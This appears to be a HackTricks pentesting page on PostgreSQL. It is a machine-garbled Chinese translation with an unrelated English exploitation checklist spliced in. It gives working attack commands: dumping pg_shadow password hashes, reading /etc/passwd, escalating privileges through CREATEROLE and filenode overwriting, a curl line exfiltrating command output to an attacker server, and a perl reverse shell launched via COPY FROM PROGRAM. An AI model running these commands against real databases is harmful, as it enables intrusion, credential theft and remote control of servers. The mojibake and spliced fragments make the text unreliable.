# 5432,5433 - Pentesting Postgresql

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) å¯è½»æ¾æ„å»ºå¹¶é€šè¿‡ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* ä¸Šå…³æ³¨æˆ‘ä»¬\*\*ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## **åŸºæœ¬ä¿¡æ¯**

**PostgreSQL** è¢«æè¿°ä¸ºä¸€ç§**é¢å‘å¯¹è±¡çš„å…³ç³»å‹æ•°æ®åº“ç³»ç»Ÿ**ï¼Œæ˜¯**å¼€æº**çš„ã€‚è¯¥ç³»ç»Ÿä¸ä»…ä½¿ç”¨ SQL è¯­è¨€ï¼Œè¿˜é€šè¿‡é™„åŠ åŠŸèƒ½å¢å¼ºäº†å®ƒã€‚å…¶åŠŸèƒ½ä½¿å…¶èƒ½å¤Ÿå¤„ç†å„ç§æ•°æ®ç±»å‹å’Œæ“ä½œï¼Œä½¿å…¶æˆä¸ºå¼€å‘äººå‘˜å’Œç»„ç»‡çš„å¤šåŠŸèƒ½é€‰æ‹©ã€‚

\*\*é»˜è®¤ç«¯å£ï¼š\*\*5432ï¼Œå¦‚æœæ­¤ç«¯å£å·²è¢«ä½¿ç”¨ï¼Œä¼¼ä¹ postgresql å°†ä½¿ç”¨ä¸‹ä¸€ä¸ªæœªä½¿ç”¨çš„ç«¯å£ï¼ˆå¯èƒ½æ˜¯ 5433ï¼‰ã€‚

```
PORT     STATE SERVICE
5432/tcp open  pgsql
```

## è¿æ¥å’ŒåŸºæœ¬æšä¸¾

```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```

{% hint style="warning" %}
å¦‚æœè¿è¡Œ **`\list`** å‘½ä»¤å‘ç°ä¸€ä¸ªåä¸º **`rdsadmin`** çš„æ•°æ®åº“ï¼Œé‚£ä¹ˆä½ å°±çŸ¥é“ä½ åœ¨ä¸€ä¸ª **AWS postgresqlæ•°æ®åº“** å†…ã€‚
{% endhint %}

è¦äº†è§£æ›´å¤šå…³äº**å¦‚ä½•æ»¥ç”¨PostgreSQLæ•°æ®åº“**çš„ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## è‡ªåŠ¨æšä¸¾

```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```

### [**æš´åŠ›ç ´è§£**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **ç«¯å£æ‰«æ**

æ ¹æ®[**è¿™é¡¹ç ”ç©¶**](https://www.exploit-db.com/papers/13084)ï¼Œå½“è¿æ¥å°è¯•å¤±è´¥æ—¶ï¼Œ`dblink`ä¼šæŠ›å‡ºä¸€ä¸ª`sqlclient_unable_to_establish_sqlconnection`å¼‚å¸¸ï¼Œå…¶ä¸­åŒ…æ‹¬é”™è¯¯çš„è§£é‡Šã€‚ä»¥ä¸‹æ˜¯è¿™äº›ç»†èŠ‚çš„ç¤ºä¾‹ã€‚

```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```

* ä¸»æœºå·²å®•æœº

`DETAIL: æ— æ³•è¿æ¥åˆ°æœåŠ¡å™¨: ä¸»æœºä¸å¯è¾¾ æœåŠ¡å™¨æ˜¯å¦åœ¨ä¸»æœº"1.2.3.4"ä¸Šè¿è¡Œï¼Œå¹¶æ¥å—ç«¯å£5678ä¸Šçš„TCP/IPè¿æ¥ï¼Ÿ`

* ç«¯å£å·²å…³é—­

```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```

* ç«¯å£æ˜¯å¼€æ”¾çš„

```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```

````markdown
## PostgreSQL

### Enumeration

1. **Banner Grabbing**: Use tools like `nc` or `telnet` to connect to the PostgreSQL service and grab the banner to identify the version running.

2. **Nmap Scripts**: Nmap has scripts specifically designed for PostgreSQL enumeration. Use the following command:
   ```bash
   nmap -p 5432 --script postgresql-* <target>
````

3. **Manual Connection**: Use `psql` to manually connect to the PostgreSQL service and gather information about the databases and users.

### Exploitation

1. **Default Credentials**: Check for default credentials like `postgres:postgres` or weak credentials in use.
2. **SQL Injection**: Exploit SQL injection vulnerabilities in web applications connected to the PostgreSQL database.
3. **Privilege Escalation**: Look for ways to escalate privileges within the PostgreSQL service or the underlying operating system.

### Post-Exploitation

1. **Dumping Data**: Use tools like `pg_dump` to dump the contents of databases for further analysis.
2. **Creating Backdoors**: Create backdoors for persistent access to the PostgreSQL service.
3. **Covering Tracks**: Remove evidence of the attack by deleting logs and other traces of unauthorized access.

### Countermeasures

1. **Strong Credentials**: Always use strong, unique passwords for PostgreSQL accounts.
2. **Regular Updates**: Keep the PostgreSQL server updated with the latest security patches to prevent exploitation of known vulnerabilities.
3. **Network Segmentation**: Implement network segmentation to restrict access to the PostgreSQL service from unauthorized users.

```
```

DETAIL: FATAL: password authentication failed for user "name"

```
* ç«¯å£æ˜¯å¼€æ”¾çš„æˆ–è¢«è¿‡æ»¤çš„
```

DETAIL: could not connect to server: Connection timed out Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?

````
åœ¨PL/pgSQLå‡½æ•°ä¸­ï¼Œç›®å‰æ— æ³•è·å–å¼‚å¸¸è¯¦ç»†ä¿¡æ¯ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ‚¨å¯ä»¥ç›´æ¥è®¿é—®PostgreSQLæœåŠ¡å™¨ï¼Œåˆ™å¯ä»¥æ£€ç´¢æ‰€éœ€çš„ä¿¡æ¯ã€‚å¦‚æœä»ç³»ç»Ÿè¡¨ä¸­æå–ç”¨æˆ·åå’Œå¯†ç ä¸å¯è¡Œï¼Œæ‚¨å¯ä»¥è€ƒè™‘ä½¿ç”¨å‰ä¸€èŠ‚è®¨è®ºçš„å­—å…¸æ”»å‡»æ–¹æ³•ï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šäº§ç”Ÿç§¯æçš„ç»“æœã€‚

## ç‰¹æƒæšä¸¾

### è§’è‰²

| è§’è‰²ç±»å‹      |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | è§’è‰²å…·æœ‰è¶…çº§ç”¨æˆ·ç‰¹æƒ                                                                                                                                |
| rolinherit     | è§’è‰²è‡ªåŠ¨ç»§æ‰¿å…¶æˆå‘˜è§’è‰²çš„ç‰¹æƒ                                                                                                                        |
| rolcreaterole  | è§’è‰²å¯ä»¥åˆ›å»ºæ›´å¤šè§’è‰²                                                                                                                               |
| rolcreatedb    | è§’è‰²å¯ä»¥åˆ›å»ºæ•°æ®åº“                                                                                                                                 |
| rolcanlogin    | è§’è‰²å¯ä»¥ç™»å½•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ­¤è§’è‰²å¯ä»¥ä½œä¸ºåˆå§‹ä¼šè¯æˆæƒæ ‡è¯†ç¬¦                                                                                           |
| rolreplication | è§’è‰²æ˜¯å¤åˆ¶è§’è‰²ã€‚å¤åˆ¶è§’è‰²å¯ä»¥å¯åŠ¨å¤åˆ¶è¿æ¥å¹¶åˆ›å»ºå’Œåˆ é™¤å¤åˆ¶æ’æ§½ã€‚                                                                                     |
| rolconnlimit   | å¯¹äºå¯ä»¥ç™»å½•çš„è§’è‰²ï¼Œè®¾ç½®æ­¤è§’è‰²å¯ä»¥è¿›è¡Œçš„æœ€å¤§å¹¶å‘è¿æ¥æ•°ã€‚-1è¡¨ç¤ºæ— é™åˆ¶ã€‚                                                                             |
| rolpassword    | ä¸æ˜¯å¯†ç ï¼ˆå§‹ç»ˆæ˜¾ç¤ºä¸º `********`ï¼‰                                                                                                                    |
| rolvaliduntil  | å¯†ç è¿‡æœŸæ—¶é—´ï¼ˆä»…ç”¨äºå¯†ç èº«ä»½éªŒè¯ï¼‰ï¼›å¦‚æœä¸è¿‡æœŸï¼Œåˆ™ä¸ºnull                                                                                             |
| rolbypassrls   | è§’è‰²ç»•è¿‡æ¯ä¸ªè¡Œçº§å®‰å…¨ç­–ç•¥ï¼Œè¯·å‚é˜…[ç¬¬5.8èŠ‚](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)äº†è§£æ›´å¤šä¿¡æ¯ã€‚                        |
| rolconfig      | è¿è¡Œæ—¶é…ç½®å˜é‡çš„è§’è‰²ç‰¹å®šé»˜è®¤å€¼                                                                                                                      |
| oid            | è§’è‰²çš„ID                                                                                                                                           |

#### æœ‰è¶£çš„ç»„

* å¦‚æœæ‚¨æ˜¯ **`pg_execute_server_program`** çš„æˆå‘˜ï¼Œåˆ™å¯ä»¥ **æ‰§è¡Œ** ç¨‹åº
* å¦‚æœæ‚¨æ˜¯ **`pg_read_server_files`** çš„æˆå‘˜ï¼Œåˆ™å¯ä»¥ **è¯»å–** æ–‡ä»¶
* å¦‚æœæ‚¨æ˜¯ **`pg_write_server_files`** çš„æˆå‘˜ï¼Œåˆ™å¯ä»¥ **å†™å…¥** æ–‡ä»¶

<div data-gb-custom-block data-tag="hint" data-style='info'>

è¯·æ³¨æ„ï¼Œåœ¨Postgresä¸­ï¼Œ**ç”¨æˆ·**ã€**ç»„**å’Œ**è§’è‰²**æ˜¯**ç›¸åŒçš„**ã€‚è¿™å–å†³äºæ‚¨å¦‚ä½•ä½¿ç”¨å®ƒä»¥åŠæ˜¯å¦**å…è®¸ç™»å½•**ã€‚

</div>

```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
````

### è¡¨æ ¼

```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```

### å‡½æ•°

```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```

## æ–‡ä»¶ç³»ç»Ÿæ“ä½œ

### è¯»å–ç›®å½•å’Œæ–‡ä»¶

ä»è¿™ä¸ª[**æäº¤**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a)ä¸­ï¼Œå®šä¹‰çš„\*\*`DEFAULT_ROLE_READ_SERVER_FILES`**ç»„æˆå‘˜ï¼ˆç§°ä¸º**`pg_read_server_files`**ï¼‰å’Œ**è¶…çº§ç”¨æˆ·**å¯ä»¥åœ¨ä»»ä½•è·¯å¾„ä¸Šä½¿ç”¨**`COPY`\*\*æ–¹æ³•ï¼ˆæŸ¥çœ‹`genfile.c`ä¸­çš„`convert_and_check_filename`ï¼‰:

```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```

{% hint style="warning" %}
è¯·è®°ä½ï¼Œå¦‚æœæ‚¨ä¸æ˜¯è¶…çº§ç”¨æˆ·ä½†å…·æœ‰**CREATEROLE**æƒé™ï¼Œåˆ™å¯ä»¥**å°†è‡ªå·±æ·»åŠ åˆ°è¯¥ç»„ä¸­ï¼š**

```sql
GRANT pg_read_server_files TO username;
```

[**æ›´å¤šä¿¡æ¯**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

æœ‰å…¶ä»–**PostgreSQLå‡½æ•°**å¯ç”¨äº**è¯»å–æ–‡ä»¶æˆ–åˆ—å‡ºç›®å½•**ã€‚åªæœ‰**è¶…çº§ç”¨æˆ·**å’Œ**å…·æœ‰æ˜¾å¼æƒé™**çš„ç”¨æˆ·å¯ä»¥ä½¿ç”¨å®ƒä»¬ï¼š

```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```

æ‚¨å¯ä»¥åœ¨[https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)æ‰¾åˆ°**æ›´å¤šå‡½æ•°**

### ç®€å•æ–‡ä»¶å†™å…¥

åªæœ‰**è¶…çº§ç”¨æˆ·**å’Œ\*\*`pg_write_server_files`\*\*æˆå‘˜æ‰èƒ½ä½¿ç”¨`copy`æ¥å†™å…¥æ–‡ä»¶ã€‚

```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```

{% hint style="warning" %}
è¯·è®°ä½ï¼Œå¦‚æœæ‚¨ä¸æ˜¯è¶…çº§ç”¨æˆ·ä½†å…·æœ‰\*\*`CREATEROLE`**æƒé™ï¼Œåˆ™å¯ä»¥**å°†è‡ªå·±æ·»åŠ åˆ°è¯¥ç»„ä¸­ï¼š\*\*

```sql
GRANT pg_write_server_files TO username;
```

[**æ›´å¤šä¿¡æ¯**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

è¯·è®°ä½ï¼ŒCOPY æ— æ³•å¤„ç†æ¢è¡Œç¬¦ï¼Œå› æ­¤å³ä½¿æ‚¨ä½¿ç”¨ base64 è´Ÿè½½ï¼Œ**æ‚¨ä¹Ÿéœ€è¦å‘é€ä¸€è¡Œå‘½ä»¤**ã€‚\
è¿™ç§æŠ€æœ¯çš„ä¸€ä¸ªéå¸¸é‡è¦çš„é™åˆ¶æ˜¯\*\*`copy` æ— æ³•ç”¨äºç¼–å†™äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå› ä¸ºå®ƒä¼šä¿®æ”¹ä¸€äº›äºŒè¿›åˆ¶å€¼ã€‚\*\*

### **ä¸Šä¼ äºŒè¿›åˆ¶æ–‡ä»¶**

ç„¶è€Œï¼Œè¿˜æœ‰**å…¶ä»–æŠ€æœ¯å¯ä»¥ä¸Šä¼ å¤§å‹äºŒè¿›åˆ¶æ–‡ä»¶ï¼š**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**æ¼æ´èµé‡‘æç¤º**ï¼š**æ³¨å†Œ** Intigritiï¼Œè¿™æ˜¯ä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§**æ¼æ´èµé‡‘å¹³å°**ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬ï¼Œè®¿é—® [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾\*\*$100,000\*\*çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

### é€šè¿‡æœ¬åœ°æ–‡ä»¶å†™å…¥æ›´æ–° PostgreSQL è¡¨æ•°æ®

å¦‚æœæ‚¨æœ‰å¿…è¦çš„æƒé™æ¥è¯»å†™ PostgreSQL æœåŠ¡å™¨æ–‡ä»¶ï¼Œæ‚¨å¯ä»¥é€šè¿‡**è¦†ç›–å…³è”æ–‡ä»¶èŠ‚ç‚¹**åœ¨[PostgreSQL æ•°æ®ç›®å½•](https://www.postgresql.org/docs/8.1/storage.html)ä¸Šæ›´æ–°æœåŠ¡å™¨ä¸Šçš„ä»»ä½•è¡¨ã€‚æœ‰å…³æ­¤æŠ€æœ¯çš„**æ›´å¤šä¿¡æ¯**[**åœ¨è¿™é‡Œ**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users)ã€‚

æ‰€éœ€æ­¥éª¤ï¼š

1. è·å– PostgreSQL æ•°æ®ç›®å½•

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**æ³¨æ„ï¼š** å¦‚æœæ— æ³•ä»è®¾ç½®ä¸­æ£€ç´¢å½“å‰æ•°æ®ç›®å½•è·¯å¾„ï¼Œæ‚¨å¯ä»¥é€šè¿‡ `SELECT version()` æŸ¥è¯¢æŸ¥è¯¢ä¸»è¦çš„ PostgreSQL ç‰ˆæœ¬ï¼Œç„¶åå°è¯•æš´åŠ›ç ´è§£è·¯å¾„ã€‚åœ¨ Unix å®‰è£…çš„ PostgreSQL ä¸Šï¼Œå¸¸è§çš„æ•°æ®ç›®å½•è·¯å¾„æ˜¯ `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`ã€‚å¸¸è§çš„é›†ç¾¤åç§°æ˜¯ `main`ã€‚ 2. è·å–ä¸ç›®æ ‡è¡¨å…³è”çš„æ–‡ä»¶èŠ‚ç‚¹çš„ç›¸å¯¹è·¯å¾„

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

æ­¤æŸ¥è¯¢åº”è¿”å›ç±»ä¼¼ `base/3/1337` çš„å†…å®¹ã€‚ç£ç›˜ä¸Šçš„å®Œæ•´è·¯å¾„å°†æ˜¯ `$DATA_DIRECTORY/base/3/1337`ï¼Œå³ `/var/lib/postgresql/13/main/base/3/1337`ã€‚ 3. é€šè¿‡ `lo_*` å‡½æ•°ä¸‹è½½æ–‡ä»¶èŠ‚ç‚¹

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4. è·å–ä¸ç›®æ ‡è¡¨å…³è”çš„æ•°æ®ç±»å‹

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5. ä½¿ç”¨ [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) æ¥[ç¼–è¾‘æ–‡ä»¶èŠ‚ç‚¹](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users)ï¼›å°†æ‰€æœ‰ `rol*` å¸ƒå°”æ ‡å¿—è®¾ç½®ä¸º 1 ä»¥è·å–å®Œå…¨æƒé™ã€‚

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor æ¼”ç¤º](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo\_datatype.gif) 6. é€šè¿‡ `lo_*` å‡½æ•°é‡æ–°ä¸Šä¼ ç¼–è¾‘åçš„æ–‡ä»¶èŠ‚ç‚¹ï¼Œå¹¶è¦†ç›–ç£ç›˜ä¸Šçš„åŸå§‹æ–‡ä»¶

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7. _(å¯é€‰)_ é€šè¿‡è¿è¡Œæ˜‚è´µçš„ SQL æŸ¥è¯¢æ¥æ¸…é™¤å†…å­˜è¡¨ç¼“å­˜

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8. æ‚¨ç°åœ¨åº”è¯¥åœ¨ PostgreSQL ä¸­çœ‹åˆ°æ›´æ–°åçš„è¡¨å€¼ã€‚

æ‚¨è¿˜å¯ä»¥é€šè¿‡ç¼–è¾‘ `pg_authid` è¡¨æˆä¸ºè¶…çº§ç®¡ç†å‘˜ã€‚**è¯·å‚é˜…**[**ä»¥ä¸‹éƒ¨åˆ†**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables)ã€‚

## RCE

### **RCE åˆ°ç¨‹åº**

è‡ª[ç‰ˆæœ¬ 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html)èµ·ï¼Œåªæœ‰**è¶…çº§ç”¨æˆ·**å’Œ\*\*`pg_execute_server_program`\*\* ç»„çš„æˆå‘˜æ‰èƒ½ä½¿ç”¨ copy è¿›è¡Œ RCEï¼ˆä¾‹å¦‚ï¼Œç”¨äºæ•°æ®æ³„éœ²çš„ç¤ºä¾‹ï¼š

```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```

ç¤ºä¾‹æ‰§è¡Œï¼š

```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```

{% hint style="warning" %}
è¯·è®°ä½ï¼Œå¦‚æœæ‚¨ä¸æ˜¯è¶…çº§ç”¨æˆ·ä½†å…·æœ‰\*\*`CREATEROLE`**æƒé™ï¼Œåˆ™å¯ä»¥**å°†è‡ªå·±æ·»åŠ åˆ°è¯¥ç»„ä¸­ï¼š\*\*

```sql
GRANT pg_execute_server_program TO username;
```

[**æ›´å¤šä¿¡æ¯**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

æˆ–è€…ä½¿ç”¨ **metasploit** ä¸­çš„ `multi/postgres/postgres_copy_from_program_cmd_exec` æ¨¡å—ã€‚\
å…³äºæ­¤æ¼æ´çš„æ›´å¤šä¿¡æ¯[**åœ¨è¿™é‡Œ**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)ã€‚å°½ç®¡è¢«æŠ¥å‘Šä¸º CVE-2019-9193ï¼Œä½†Postgeså®£ç§°è¿™æ˜¯ä¸€ä¸ª[åŠŸèƒ½ï¼Œä¸ä¼šä¿®å¤](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/)ã€‚

### ä½¿ç”¨PostgreSQLè¯­è¨€è¿›è¡ŒRCE

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### ä½¿ç”¨PostgreSQLæ‰©å±•è¿›è¡ŒRCE

ä¸€æ—¦ä½ ä»ä¹‹å‰çš„å¸–å­ä¸­**å­¦ä¼šäº†å¦‚ä½•ä¸Šä¼ äºŒè¿›åˆ¶æ–‡ä»¶**ï¼Œä½ å¯ä»¥å°è¯•è·å–**RCEä¸Šä¼ postgresqlæ‰©å±•å¹¶åŠ è½½å®ƒ**ã€‚

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### PostgreSQLé…ç½®æ–‡ä»¶RCE

{% hint style="info" %}
ä»¥ä¸‹RCEå‘é‡åœ¨å—é™åˆ¶çš„SQLiä¸Šä¸‹æ–‡ä¸­ç‰¹åˆ«æœ‰ç”¨ï¼Œå› ä¸ºæ‰€æœ‰æ­¥éª¤éƒ½å¯ä»¥é€šè¿‡åµŒå¥—çš„SELECTè¯­å¥æ‰§è¡Œ
{% endhint %}

PostgreSQLçš„**é…ç½®æ–‡ä»¶**ç”±**postgresç”¨æˆ·**ï¼ˆè¿è¡Œæ•°æ®åº“çš„ç”¨æˆ·ï¼‰æ‹¥æœ‰å¯å†™æƒé™ï¼Œå› æ­¤ä½œä¸º**è¶…çº§ç”¨æˆ·**ï¼Œæ‚¨å¯ä»¥åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­å†™å…¥æ–‡ä»¶ï¼Œå› æ­¤å¯ä»¥**è¦†ç›–æ­¤æ–‡ä»¶ã€‚**

![](<../.gitbook/assets/image (303).png>)

#### **ä½¿ç”¨ssl\_passphrase\_commandè¿›è¡ŒRCE**

æœ‰å…³æ­¤æŠ€æœ¯çš„æ›´å¤šä¿¡æ¯[è¯·ç‚¹å‡»æ­¤å¤„](https://pulsesecurity.co.nz/articles/postgres-sqli)ã€‚

é…ç½®æ–‡ä»¶å…·æœ‰ä¸€äº›æœ‰è¶£çš„å±æ€§ï¼Œå¯ä»¥å¯¼è‡´RCEï¼š

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` æ•°æ®åº“ç§é’¥çš„è·¯å¾„
* `ssl_passphrase_command = ''` å¦‚æœç§æœ‰æ–‡ä»¶å—å¯†ç ä¿æŠ¤ï¼ˆåŠ å¯†ï¼‰ï¼ŒPostgreSQLå°†**æ‰§è¡Œæ­¤å±æ€§ä¸­æŒ‡å®šçš„å‘½ä»¤**ã€‚
